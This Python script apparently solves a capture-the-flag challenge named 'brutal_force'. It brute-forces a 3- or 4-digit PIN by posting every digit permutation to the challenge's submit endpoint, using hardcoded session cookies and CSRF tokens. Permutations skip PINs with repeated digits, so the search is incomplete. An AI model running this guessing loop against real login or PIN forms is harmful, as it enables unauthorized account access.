import pprint
import requests
from typing import Generator
from time import time, sleep
from itertools import permutations

def brute_force_pin_hack():
    """
    brute force using permutations
    """
    number_range = range(10)
    host = 'https://hack.ainfosec.com/challenge/submit-answer/'
    cookies = {
        "csrftoken": "w4W4jqR0NuouLLsle5bmes9iLpMOP2XUGBabHUtHG0EGLMEfDErYrIknOr6mE3JY",
        "sessionid": "eytcicnshacqh0sc0cq9njvpbqm9yw1f"
    }
    payload = {
        "csrfmiddlewaretoken": "kaKSjH5fAYccwFR879rdn1J0Z6Qun52TuHYZHbHWtusowG32wIHPAhU528a2c6OX",
        "challenge_id": "brutal_force"
    }
    digits = [3, 4]
    k = len(digits) - 1
    result_pin = []
    seen = {key: True for key in open('seen.txt').read().rstrip().split('\n')}

    while k >= 0:
        digit = digits[k]
        perms = permutations(number_range, digit)
        
        for perm in perms:
            pin = ''.join(str(num) for num in perm)
            
            if pin in seen:
                continue

            payload['answer'] = pin
            res = requests.post(host, data=payload, cookies=cookies)
            res_data = res.json()

            with open('seen.txt', 'a') as fd:
                fd.write(pin + '\n')

            if res_data.get('error') and res_data['error'] == 'Invalid answer.':
                print(f'{pin}: Incorrect pin. Trying next permutation')
                continue
            result_pin.append(pin)
            break
        k -= 1
    return result_pin


if __name__ == '__main__':
    t2 = time()
    r = brute_force_pin_hack()
    elt2 = time() - t2

    print(f"{'-' * 113}")
    print()
    print('ALGORITHM 2')
    print('Time: ', elt2)
    print("\n\n", r)
    print(f"{'-' * 113}")
